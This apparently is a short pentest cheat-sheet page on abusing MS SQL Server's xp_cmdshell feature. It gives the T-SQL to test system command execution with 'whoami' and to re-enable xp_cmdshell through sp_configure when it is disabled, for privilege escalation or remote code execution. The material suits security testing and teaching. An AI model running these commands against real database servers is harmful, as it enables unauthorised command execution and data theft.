---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# MS SQL - xp\_cmdshell Abuse

_xp\_cmdshell_ is a feature in MS SQL Server for executing system commands which if not properly configured, can be abused for achieving privilege escalation, RCE, or data theft.

Here is a guide on how to do this leveraging process once we are inside _MS SQL_:

* Check if _xp\_cmdshell_ is active by trying to execute a system command

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash"><strong>EXEC xp_cmdshell 'whoami'; #Example
</strong></code></pre>

***

* In case its use is disabled, do the reconfiguration and try the execution again

{% code overflow="wrap" lineNumbers="true" %}
```bash
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXEC xp_cmdshell 'whoami'; #This should now work normally
```
{% endcode %}
